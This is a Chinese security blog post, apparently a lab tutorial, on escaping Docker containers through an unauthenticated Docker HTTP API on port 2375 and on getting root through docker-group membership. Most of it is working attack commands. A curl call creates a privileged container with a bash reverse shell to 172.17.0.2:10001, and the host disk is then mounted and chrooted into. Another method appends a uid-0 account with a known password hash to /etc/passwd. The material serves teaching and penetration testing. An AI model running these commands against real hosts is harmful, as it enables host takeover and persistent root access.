<h1 id="配置不当"><a href="#配置不当" class="headerlink" title="配置不当"></a>配置不当</h1><h2 id="docker-http-api暴露"><a href="#docker-http-api暴露" class="headerlink" title="docker http api暴露"></a>docker http api暴露</h2><h3 id="实验环境配置-7"><a href="#实验环境配置-7" class="headerlink" title="实验环境配置"></a>实验环境配置</h3><p>http没有身份认证，攻击者可以直接控制docker,并且可以轻松控制宿主机</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Service]  </span><br><span class="line">ExecStart= -H tcp://<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">2375</span>   </span><br></pre></td></tr></table></figure>
<p>execstart后面加上一下就可以启动http api</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660548642077-f9b6bd41-47c2-4c3f-a2f0-b96b4acfb371.png#averageHue=%231e1e1d&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=209&id=ISUDI&originHeight=522&originWidth=2104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101049&status=error&style=none&taskId=uc950534b-649b-475d-af02-40180d51451&title=&width=841.6" alt="image.png"><br>通过docker http api访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">2375</span> images</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660548642014-89cac487-3b23-4757-8d30-84d10171ab05.png#averageHue=%23201e1d&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=153&id=ay71F&originHeight=383&originWidth=2128&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81434&status=error&style=none&taskId=u833ac6fb-ece2-4799-9074-4a0853109a4&title=&width=851.2" alt="image.png"></p>
<h3 id="实际利用-7"><a href="#实际利用-7" class="headerlink" title="实际利用"></a>实际利用</h3><p>首先在容器中检查是否存在docker api问题</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">IP=`hostname</span> <span class="string">-i</span> <span class="string">|</span> <span class="string">awk</span> <span class="string">-F.</span> <span class="string">&#x27;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#x27;</span> <span class="string">`</span> <span class="string">&amp;&amp;</span> <span class="string">timeout</span> <span class="number">3</span> <span class="string">bash</span> <span class="string">-c</span> <span class="string">&quot;echo &gt;/dev/tcp/$IP/2375&quot;</span> <span class="string">&gt;</span> <span class="string">/dev/null</span> <span class="number">2</span><span class="string">&gt;&amp;1</span> <span class="string">&amp;&amp;</span> <span class="string">echo</span> <span class="string">&quot;Docker Remote API Is Enabled.&quot;</span> <span class="string">||</span> <span class="string">echo</span> <span class="string">&quot;Docker Remote API is Closed.&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660549882070-787d0911-7ebf-49c7-9095-a5693bfee68d.png#averageHue=%23262524&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=44&id=GslyB&originHeight=109&originWidth=3025&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35295&status=error&style=none&taskId=u572df5a7-2fd9-4ac7-a7ca-82003b3606a&title=&width=1210" alt="image.png"><br>尝试使用docker api</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">-H</span> <span class="string">tcp://172.17.0.1:2375</span> <span class="string">ps</span></span><br></pre></td></tr></table></figure>
<p>但这个时候我们没有docker命令行怎么办</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">curl</span> <span class="string">http://172.17.0.1:2375/images/json</span></span><br></pre></td></tr></table></figure>
<p>查看有哪些镜像，我们等会直接用<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660550282085-a2bb42fd-35ba-41af-8718-81347ecd348b.png#averageHue=%23333126&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=111&id=nMQYa&originHeight=278&originWidth=3021&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113365&status=error&style=none&taskId=ua9419edb-f378-4b93-9d6a-17f696a5053&title=&width=1208.4" alt="image.png"></p>
<h4 id="Entrypoint设置为反弹shell"><a href="#Entrypoint设置为反弹shell" class="headerlink" title="Entrypoint设置为反弹shell"></a>Entrypoint设置为反弹shell</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">curl</span> <span class="string">-X</span> <span class="string">POST</span> <span class="string">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> <span class="string">-d</span> <span class="string">&quot;&#123;</span></span><br><span class="line"><span class="string">     \&quot;Image\&quot;: \&quot;ubuntu:18.04\&quot;,</span></span><br><span class="line"><span class="string">     \&quot;HostConfig\&quot;: &#123;</span></span><br><span class="line"><span class="string">         \&quot;Privileged\&quot;: true</span></span><br><span class="line"><span class="string">     &#125;,</span></span><br><span class="line"><span class="string">   \&quot;Cmd\&quot;:[</span></span><br><span class="line"><span class="string">                 \&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.2/10001  0&gt;&amp;1\&quot;</span></span><br><span class="line"><span class="string">             ]</span></span><br><span class="line"><span class="string"> &#125;&quot;</span> <span class="string">http://172.17.0.1:2375/containers/create</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660555518991-58ca570c-b5a7-4b9d-b495-e2b5cd53c075.png#averageHue=%231f1e1d&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=184&id=Y98G6&originHeight=460&originWidth=1781&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63014&status=error&style=none&taskId=uadc3b896-a36c-4fc9-b417-fcc9a3c9b2a&title=&width=712.4" alt="image.png"><br>监听port，然后启动容器</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">curl</span> <span class="string">-X</span> <span class="string">POST</span>  <span class="string">http://172.17.0.1:2375/containers/45af8059b2144209053cf4375d93a06d4d9304eedc164ea1c503b2d60e0945f4/start</span>  </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660555581978-3eb9a7f7-3551-4b33-a7e3-0c55d7104498.png#averageHue=%2323201f&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=81&id=V14P0&originHeight=202&originWidth=1653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34430&status=error&style=none&taskId=u4430c275-8548-4def-aa8b-477ffdaca9a&title=&width=661.2" alt="image.png"></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">fdisk</span> <span class="string">-l|grep</span> <span class="string">Linux</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660555920523-903aee8a-3975-416e-8f11-02d8235a1280.png#averageHue=%23edefdb&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=52&id=WKrIi&originHeight=130&originWidth=1320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22077&status=error&style=none&taskId=u9b7eca85-67b5-4368-a4d7-99828afa453&title=&width=528" alt="image.png"></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">mkdir</span> <span class="string">/host_fs&amp;&amp;mount</span> <span class="string">/dev/sda5</span> <span class="string">/host_fs&amp;&amp;chroot</span> <span class="string">/host_fs</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558443588-1076a4ca-ef6f-49d8-ae57-d4afd97e0acf.png#averageHue=%231c1c1c&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=547&id=VjEwK&originHeight=1368&originWidth=1712&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67200&status=error&style=none&taskId=uf55b623c-e57c-4a49-af1d-7328b88250e&title=&width=684.8" alt="image.png"><br>接下来可以写个crontab然后就是完整逃逸了</p>
<h4 id="运行反弹shell的命令"><a href="#运行反弹shell的命令" class="headerlink" title="运行反弹shell的命令"></a>运行反弹shell的命令</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">curl</span> <span class="string">-X</span> <span class="string">POST</span> <span class="string">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> <span class="string">-d</span> <span class="string">&quot;&#123;</span></span><br><span class="line"><span class="string">     \&quot;Image\&quot;: \&quot;ubuntu:18.04\&quot;,</span></span><br><span class="line"><span class="string">     \&quot;HostConfig\&quot;: &#123;</span></span><br><span class="line"><span class="string">         \&quot;Privileged\&quot;: true</span></span><br><span class="line"><span class="string">     &#125;,</span></span><br><span class="line"><span class="string">   \&quot;Cmd\&quot;:[</span></span><br><span class="line"><span class="string">                 \&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;while true;do sleep 1;done\&quot;</span></span><br><span class="line"><span class="string">             ]</span></span><br><span class="line"><span class="string"> &#125;&quot;</span> <span class="string">http://172.17.0.1:2375/containers/create</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558510775-57e1112e-0029-4a3b-a934-82f33f119320.png#averageHue=%231f1e1d&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=196&id=sIDxx&originHeight=489&originWidth=2217&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67680&status=error&style=none&taskId=u3a71a2ff-76a2-4c1b-a8b9-9195dbbbefa&title=&width=886.8" alt="image.png"><br>启动container</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">curl</span> <span class="string">-X</span> <span class="string">POST</span>  <span class="string">http://172.17.0.1:2375/containers/d2a79a8b7504eced18ae2a80c853fb10ccecebe1cb247c0c10020038aef1fe71/start</span>  </span><br></pre></td></tr></table></figure>
<p>先反弹一个shell</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">curl</span> <span class="string">-X</span> <span class="string">POST</span> <span class="string">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> <span class="string">-d</span> <span class="string">&quot;&#123;</span></span><br><span class="line"><span class="string">    \&quot;Cmd\&quot;: [\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.2/10001  0&gt;&amp;1\&quot;]</span></span><br><span class="line"><span class="string">&#125;&quot;</span> <span class="string">http://172.17.0.1:2375/containers/d2a79a8b7504eced18ae2a80c853fb10ccecebe1cb247c0c10020038aef1fe71/exec</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558540070-2f737447-42c5-4bd7-a10e-d73b3f4a706c.png#averageHue=%232f2c25&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=78&id=yRVGj&originHeight=194&originWidth=2302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51093&status=error&style=none&taskId=u7bade40e-85b9-4a6b-9c75-7ba99b74cee&title=&width=920.8" alt="image.png"><br>这里获得了一个exec的实例，还需要start,先监听端口</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">curl</span> <span class="string">-X</span> <span class="string">POST</span>  <span class="string">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> <span class="string">-d</span> <span class="string">&quot;&#123;&#125;&quot;</span> <span class="string">http://172.17.0.1:2375/exec/f9b1940dfe2e932ee564e0f975559652ea33c1635c4f9f00721664a173fc0d3d/start</span>  </span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558567612-6e3f1e91-6a33-44a0-bf5e-383c9155a9ef.png#averageHue=%2322201f&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=112&id=MiZw5&originHeight=281&originWidth=1810&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45177&status=error&style=none&taskId=u8d81c025-f192-4b39-aba8-5135be402ed&title=&width=724" alt="image.png"><br>反弹成功，然后挂载</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">mkdir</span> <span class="string">/host_fs&amp;&amp;mount</span> <span class="string">/dev/sda5</span> <span class="string">/host_fs&amp;&amp;chroot</span> <span class="string">/host_fs</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1660558601491-9e8c4aaa-fa09-4434-bdc3-71b0ea0d0b2c.png#averageHue=%231d1c1c&clientId=u9a77b4ba-95ac-4&errorMessage=unknown%20error&from=paste&height=551&id=pT0Qc&originHeight=1377&originWidth=1944&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95006&status=error&style=none&taskId=uf1eeda53-06f0-4973-b4c8-a8a18c6cf50&title=&width=777.6" alt="image.png"><br>逃逸成功</p>
<h2 id="Docker用户组提权"><a href="#Docker用户组提权" class="headerlink" title="Docker用户组提权"></a>Docker用户组提权</h2><p>Docker 运行的所有命令都是需要sudo来运行，那是因为docker需要root权限才能运行，但如果给普通用户添加到docker用户组，那么就可以让当前用户提权成root</p>
<h3 id="实验环境配置-8"><a href="#实验环境配置-8" class="headerlink" title="实验环境配置"></a>实验环境配置</h3><p>添加用户test，并加入docker的group</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">adduser</span> <span class="string">test</span></span><br><span class="line"><span class="string">usermod</span> <span class="string">-G</span> <span class="string">docker</span> <span class="string">test</span></span><br><span class="line"><span class="string">newgrp</span> <span class="string">docker</span></span><br></pre></td></tr></table></figure>
<h3 id="实际利用-8"><a href="#实际利用-8" class="headerlink" title="实际利用"></a>实际利用</h3><h4 id="方法1-挂载宿主机根目录"><a href="#方法1-挂载宿主机根目录" class="headerlink" title="方法1:挂载宿主机根目录"></a>方法1:挂载宿主机根目录</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">su</span> <span class="string">test</span></span><br><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">-it</span> <span class="string">-v</span> <span class="string">/:/host_fs</span> <span class="string">ubuntu:18.04</span> <span class="string">bash</span></span><br><span class="line"><span class="string">chroot</span> <span class="string">/host_fs</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1659411329896-0caa3c7c-f851-406d-acd8-6ef92b71eeff.png#averageHue=%231e1d1d&clientId=u83ff2227-abf5-4&from=paste&height=134&id=ud0f67795&originHeight=334&originWidth=2186&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31238&status=done&style=none&taskId=ue9c1c063-2c98-4fc1-ad31-f1bc8c55321&title=&width=874.4" alt="image.png"></p>
<h4 id="方法2-添加一个特权账户"><a href="#方法2-添加一个特权账户" class="headerlink" title="方法2:添加一个特权账户"></a>方法2:添加一个特权账户</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">openssl</span> <span class="string">passwd</span> <span class="number">-1</span> <span class="string">-salt</span> <span class="string">test-docker</span> <span class="comment">#输入密码123456</span></span><br><span class="line"><span class="string">&gt;&gt;$1$test-doc$7Krifp/2cYh92wAZKqkJR1</span> <span class="comment">#返回的结果</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">docker</span> <span class="string">run</span> <span class="string">-v</span> <span class="string">/etc/:/mnt</span> <span class="string">-it</span> <span class="string">ubuntu:18.04</span> <span class="string">bash</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/mnt</span></span><br><span class="line"><span class="string">echo</span> <span class="string">&#x27;test-docker:$1$test-doc$7Krifp/2cYh92wAZKqkJR1:0:0::/root:/bin/bash&#x27;</span> <span class="string">&gt;&gt;passwd</span></span><br></pre></td></tr></table></figure>
<p>然后退出来，直接su test-docker提权<br>就变成root了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1659411538976-16b44784-0772-46a3-9b7b-743b1887874d.png#averageHue=%23212121&clientId=u83ff2227-abf5-4&errorMessage=unknown%20error&from=paste&height=124&id=u0a04ec1d&originHeight=310&originWidth=2141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31353&status=error&style=none&taskId=u2c23fb71-e413-4ccc-bea7-5324be2cec2&title=&width=856.4" alt="image.png"></p>
<p>未完待续..</p>

    </article>
    <!-- license -->
    
        <div class="license-wrapper">
            <p>Author：<a href="https://azraelxuemo.github.io">azraelxuemo</a>
            <p>Link：<a href="https://azraelxuemo.github.io/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">https://azraelxuemo.github.io/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</a>
            <p>Publish date：<a href="https://azraelxuemo.github.io/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">November 13th 2023, 1:51:34 pm</a>
            <p>Update date：<a href="https://azraelxuemo.github.io/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">November 28th 2023, 10:31:08 pm</a>
            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2023/11/14/k8s/" title="k8s攻防">
                    <div class="nextTitle">k8s攻防</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/" title="BUUCTF pwn刷题记录">
                    <div class="prevTitle">BUUCTF pwn刷题记录</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            

            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
            
                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/azraelxuemo" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title=wechat>
                    
                    <img class="profile-qr" src="/assets/example_qr.png" />
                </span>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
             
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E7%9A%84Capability"><span class="toc-number">2.</span> <span class="toc-text">危险的Capability</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#privileged"><span class="toc-number">2.1.</span> <span class="toc-text">privileged</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#var-spool-cron-crontabs-%E9%80%82%E7%94%A8%E4%BA%8Eubuntu-debain"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 适用于ubuntu debain</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#var-spool-cron-%E9%80%82%E7%94%A8%E4%BA%8Ecentos"><span class="toc-number">2.1.2.1.2.</span> <span class="toc-text">&#x2F;var&#x2F;spool&#x2F;cron 适用于centos</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ld-so-preload"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">ld.so.preload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">ssh</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CAP-SYS-MODULE"><span class="toc-number">2.2.</span> <span class="toc-text">CAP_SYS_MODULE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">实际利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CAP-DAC-READ-SEARCH-CAP-DAC-OVERRIDE"><span class="toc-number">2.3.</span> <span class="toc-text">CAP_DAC_READ_SEARCH,CAP_DAC_OVERRIDE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">写文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CAP-SYS-ADMIN"><span class="toc-number">2.4.</span> <span class="toc-text">CAP_SYS_ADMIN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#apparmor%E5%85%B3%E9%97%AD"><span class="toc-number">2.4.1.</span> <span class="toc-text">apparmor关闭</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-3"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8-3"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">实际利用</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E7%9A%84namespace%E5%85%B1%E4%BA%AB"><span class="toc-number">3.</span> <span class="toc-text">危险的namespace共享</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Network%E5%85%B1%E4%BA%AB"><span class="toc-number">3.1.</span> <span class="toc-text">Network共享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PID%E5%85%B1%E4%BA%AB"><span class="toc-number">3.2.</span> <span class="toc-text">PID共享</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8"><span class="toc-number">3.2.1.</span> <span class="toc-text">+特权容器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-4"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8-4"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5chroot"><span class="toc-number">3.2.1.2.1.</span> <span class="toc-text">直接chroot</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.1.2.2.</span> <span class="toc-text">进程注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E7%BC%96%E5%86%99"><span class="toc-number">3.2.1.3.</span> <span class="toc-text">shellcode编写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%98%AF%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8"><span class="toc-number">3.2.2.</span> <span class="toc-text">不是特权容器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E4%B8%8D%E5%BD%93"><span class="toc-number">4.</span> <span class="toc-text">挂载不当</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#procfs"><span class="toc-number">4.1.</span> <span class="toc-text">procfs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-5"><span class="toc-number">4.1.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8-5"><span class="toc-number">4.1.2.</span> <span class="toc-text">实际利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker-socket"><span class="toc-number">4.2.</span> <span class="toc-text">docker socket</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE-6"><span class="toc-number">4.2.1.</span> <span class="toc-text">实验环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8-6"><span class="toc-number">4.2.2.</span> <span class="toc-text">实际利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">5.</span> <span 